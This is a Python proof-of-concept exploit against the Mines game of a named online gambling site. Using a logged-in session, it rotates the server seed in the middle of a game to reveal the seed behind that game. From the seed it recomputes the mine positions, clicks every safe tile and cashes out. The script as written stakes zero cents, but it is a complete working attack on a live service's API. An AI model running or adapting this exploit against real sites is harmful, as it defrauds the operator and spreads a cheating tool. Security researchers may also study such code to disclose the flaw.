# Made for Apple Silicon Macs

import hashlib
import json
import requests
import sys

BaseUrl = "https://rainduel.com"
CookiesFile = "/tmp/rainduel_cookies.txt"


def LoadCookies():
    Cookies = {}
    try:
        with open(CookiesFile, 'r') as f:
            for Line in f:
                Line = Line.strip()
                if Line.startswith('#HttpOnly_'):
                    Line = Line[len('#HttpOnly_'):]
                elif not Line or Line.startswith('#'):
                    continue
                Parts = Line.split('\t')
                if len(Parts) >= 7:
                    Cookies[Parts[5]] = Parts[6]
    except FileNotFoundError:
        print(f"[!] Cookie file not found: {CookiesFile}")
        print("[!] Login first with: curl -c cookies.txt -X POST https://rainduel.com/api/auth/login ...")
        sys.exit(1)
    return Cookies


def Sha512Hex(Value):
    return hashlib.sha512(Value.encode()).hexdigest()


class ByteStream:
    def __init__(self, ClientSeed, ServerSeed, Nonce):
        self.ClientSeed = ClientSeed
        self.ServerSeed = ServerSeed
        self.Nonce = Nonce
        self.Round = 0
        self.BytesCache = []
        self.Index = 0

    def NextByte(self):
        if self.Index >= len(self.BytesCache):
            HashInput = f"{self.ClientSeed}:{self.ServerSeed}:{self.Nonce}:{self.Round}"
            HashHex = Sha512Hex(HashInput)
            self.BytesCache = [int(HashHex[i:i+2], 16) for i in range(0, len(HashHex), 2)]
            self.Index = 0
            self.Round += 1
        Byte = self.BytesCache[self.Index]
        self.Index += 1
        return Byte


def RandomInt(ByteStream, MaxVal):
    RangeSize = MaxVal + 1
    Limit = (256 // RangeSize) * RangeSize
    Byte = ByteStream.NextByte()
    while Byte >= Limit:
        Byte = ByteStream.NextByte()
    return Byte % RangeSize


def ComputeMines(ClientSeed, ServerSeed, Nonce, MineCount):
    Positions = list(range(25))
    ByteStreamInstance = ByteStream(ClientSeed, ServerSeed, Nonce)

    for i in range(24, 0, -1):
        j = RandomInt(ByteStreamInstance, i)
        Positions[i], Positions[j] = Positions[j], Positions[i]

    return sorted(Positions[:MineCount])


def VerifyServerSeed(RevealedSeed, ExpectedHash):
    Computed = Sha512Hex(RevealedSeed)
    return Computed == ExpectedHash


def Main():
    print("=" * 60)
    print("Proof of Concept")
    print("Exploits provably fair seed rotation to predict mines")
    print("=" * 60)

    Cookies = LoadCookies()
    Session = requests.Session()
    Session.cookies.update(Cookies)

    print("\n[1] Checking current seed state...")
    SeedsResp = Session.get(f"{BaseUrl}/api/seeds")
    if SeedsResp.status_code != 200:
        print(f"[!] Failed to get seeds: {SeedsResp.status_code}")
        sys.exit(1)

    Seeds = SeedsResp.json()
    ClientSeed = Seeds['clientSeed']
    CurrentServerHash = Seeds['serverSeedHash']
    CurrentNonce = Seeds['nonce']

    print(f"Client seed:    {ClientSeed}")
    print(f"Server hash:    {CurrentServerHash[:32]}...")
    print(f"Nonce:          {CurrentNonce}")

    MineCount = 5
    print(f"\n[2] Starting mines game (betCents=0, mines={MineCount})...")
    StartResp = Session.post(f"{BaseUrl}/api/mines/start",
                             json={"betCents": 0, "mineCount": MineCount})
    if StartResp.status_code != 200:
        print(f"[!] Failed to start game: {StartResp.text}")
        sys.exit(1)

    Game = StartResp.json()['game']
    GameId = Game['id']
    GameNonce = Game['nonce']
    GameServerHash = Game['serverSeedHash']
    GameClientSeed = Game['clientSeed']

    print(f"Game ID:        {GameId}")
    print(f"Nonce:          {GameNonce}")
    print(f"Server hash:    {GameServerHash[:32]}...")

    print(f"\n[3] Rotating server seed to reveal the old seed...")
    RotateResp = Session.post(f"{BaseUrl}/api/seeds/rotate")
    if RotateResp.status_code != 200:
        print(f"[!] Failed to rotate: {RotateResp.text}")
        sys.exit(1)

    Rotated = RotateResp.json()
    RevealedSeed = Rotated['revealedServerSeed']

    if not VerifyServerSeed(RevealedSeed, GameServerHash):
        print("[!] CRITICAL: Revealed seed does NOT match game's server seed hash!")
        print(f"Revealed: {RevealedSeed}")
        print(f"Expected hash: {GameServerHash}")
        print(f"Computed hash: {Sha512Hex(RevealedSeed)}")
        sys.exit(1)

    print(f"Revealed seed:  {RevealedSeed}")
    print(f"[OK] Seed hash verified!")

    print(f"\n[4] Computing mine positions...")
    Mines = ComputeMines(GameClientSeed, RevealedSeed, GameNonce, MineCount)
    SafeTiles = [t for t in range(25) if t not in Mines]

    print(f"MINES at positions: {Mines}")
    print(f"SAFE tiles:         {SafeTiles}")
    print(f"Total safe:         {len(SafeTiles)}/25")

    print(f"\n[5] Revealing safe tiles")
    RevealedCount = 0

    for Tile in SafeTiles:
        RevealResp = Session.post(f"{BaseUrl}/api/mines/reveal",
                                  json={"tile": Tile})
        if RevealResp.status_code != 200:
            print(f"[!] Failed to reveal tile {Tile}: {RevealResp.text}")
            break

        Result = RevealResp.json()['game']
        RevealedCount += 1

        if Result['status'] == 'lost':
            print(f"[FAIL] Hit a mine on tile {Tile}! Prediction was WRONG.")
            print(f"Actual mines: {Result['mines']}")
            print(f"Predicted:    {Mines}")
            return False
        if RevealedCount >= len(SafeTiles) - 1:
            break

    print(f"\n[6] Cashing out...")
    CashoutResp = Session.post(f"{BaseUrl}/api/mines/cashout", json={})
    if CashoutResp.status_code != 200:
        print(f"[!] Cashout failed: {CashoutResp.text}")
        return False

    Result = CashoutResp.json()['game']
    print(f"    Status:     {Result['status']}")
    print(f"    Gems found: {Result['gems']}")
    print(f"    Multiplier: {Result['multiplier']:.4f}x")
    print(f"    Payout:     {Result['payoutCents']} cents")
    print(f"    Mines:      {Result['mines']}")

    if set(Result['mines']) == set(Mines):
        print(f"\n    [SUCCESS] Mine prediction was 100% ACCURATE!")
    else:
        print(f"\n    [FAIL] Mine prediction was WRONG!")
        print(f"    Predicted: {Mines}")
        print(f"    Actual:    {Result['mines']}")
        return False

    return True


if __name__ == "__main__":
    Success = Main()
    print("\n" + "=" * 60)
    if Success:
        print("RESULT: Mines Predicted!")
    else:
        print("RESULT: Attack failed")
    print("=" * 60)
